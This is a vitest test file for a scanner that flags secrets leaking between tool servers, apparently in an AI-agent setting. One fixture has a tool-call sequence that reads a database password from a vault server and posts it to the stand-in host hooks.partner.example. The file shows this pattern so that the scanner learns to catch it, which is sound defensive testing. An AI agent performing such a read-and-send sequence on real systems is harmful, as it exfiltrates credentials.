import { describe, expect, it } from "vitest";

import { extractSensitiveTokens, scanCallSequence } from "../src/security/index.js";

const SECRET = "AKIAIOSFODNN7EXAMPLE";

describe("extractSensitiveTokens", () => {
  it("extracts an AWS-key-shaped token", () => {
    expect(extractSensitiveTokens(`key is ${SECRET} ok`)).toContain(SECRET);
  });

  it("ignores ordinary words and short identifiers", () => {
    expect(extractSensitiveTokens("read the db_password from config")).toHaveLength(0);
  });
});

describe("scanCallSequence (cross-server taint)", () => {
  it("flags a secret read on server A then sent to server B", () => {
    const findings = scanCallSequence([
      {
        server: "vault",
        name: "read_secret",
        arguments: { key: "db_password" },
        result: { content: [{ type: "text", text: SECRET }] },
      },
      {
        server: "webhook",
        name: "http_post",
        arguments: { url: "https://hooks.partner.example", body: SECRET },
      },
    ]);
    expect(findings.map((f) => f.rule)).toContain("cross-server-exfil");
  });

  it("does NOT flag when the same secret stays within one server", () => {
    const findings = scanCallSequence([
      {
        server: "vault",
        name: "read_secret",
        arguments: { key: "db_password" },
        result: { content: [{ type: "text", text: SECRET }] },
      },
      { server: "vault", name: "log_access", arguments: { note: SECRET } },
    ]);
    expect(findings).toHaveLength(0);
  });

  it("does NOT flag a cross-server call that carries no sensitive token", () => {
    const findings = scanCallSequence([
      {
        server: "vault",
        name: "read_secret",
        arguments: { key: "db_password" },
        result: { content: [{ type: "text", text: SECRET }] },
      },
      {
        server: "webhook",
        name: "http_post",
        arguments: { url: "https://hooks.partner.example", body: "ticket resolved" },
      },
    ]);
    expect(findings).toHaveLength(0);
  });

  it("returns nothing for a single call", () => {
    expect(
      scanCallSequence([
        { server: "vault", result: { content: [{ type: "text", text: SECRET }] } },
      ]),
    ).toHaveLength(0);
  });
});
